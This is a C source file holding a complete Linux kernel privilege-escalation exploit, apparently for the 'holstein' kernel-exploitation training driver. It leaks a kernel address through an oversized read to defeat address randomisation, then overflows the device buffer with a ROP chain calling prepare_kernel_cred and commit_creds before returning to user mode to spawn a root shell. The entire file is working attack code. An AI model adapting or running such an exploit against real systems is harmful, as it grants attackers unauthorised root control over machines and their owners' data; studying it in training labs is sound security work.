#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>

unsigned long user_cs, user_ss, user_sp, user_rflags;

unsigned long swapgs = 0xffffffff8160bf7e;
unsigned long pop_rdi = 0xffffffff8127bbdc;
unsigned long mov_rdi_rax = 0xffffffff8160c96b;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
unsigned long iretq = 0xffffffff810202af;
unsigned long pop_rcx = 0xffffffff8132cdd3;
unsigned long swapgs_res_reg_ret2user = 0xffffffff81800e26;



unsigned long swap (unsigned long addr, unsigned long kbase){
  addr = (addr - 0xffffffff81000000) + kbase;
  return addr;
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}


static void get_shell(){
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

unsigned long user_rip= (unsigned long) get_shell;

static void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}



int main() {
  save_state();
  //signal(SIGSEGV, get_shell);
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf1[0x480]={};

  memset (buf1, NULL , 0x480 ); 
  read(fd, buf1, 0x410 ); 
  unsigned  long addr_vfs_read = *( unsigned  long *)&buf1[ 0x408 ]; 
  unsigned  long kbase = addr_vfs_read - ( 0xffffffff8113d33c -0xffffffff81000000 ); 
  printf ( "[+] kbase = 0x%016lx\n" , kbase);

  char buf[0x410] = {};
  memset(buf,'A',0x410);
  unsigned long *chain = (unsigned long*)&buf[0x408];
  *chain++ = swap(pop_rdi,kbase);
  *chain++ = 0;
  *chain++ = swap(prepare_kernel_cred, kbase);
  *chain++ = swap(pop_rcx, kbase);
  *chain++ = 0;
  *chain++ = swap(mov_rdi_rax,kbase);
  *chain++ = swap(commit_creds,kbase);
  *chain++ = swap(swapgs_res_reg_ret2user,kbase);
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = (unsigned long)&get_shell;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;
  write(fd, buf, (void*)chain - (void*)buf);


  close(fd);
  return 0;
}
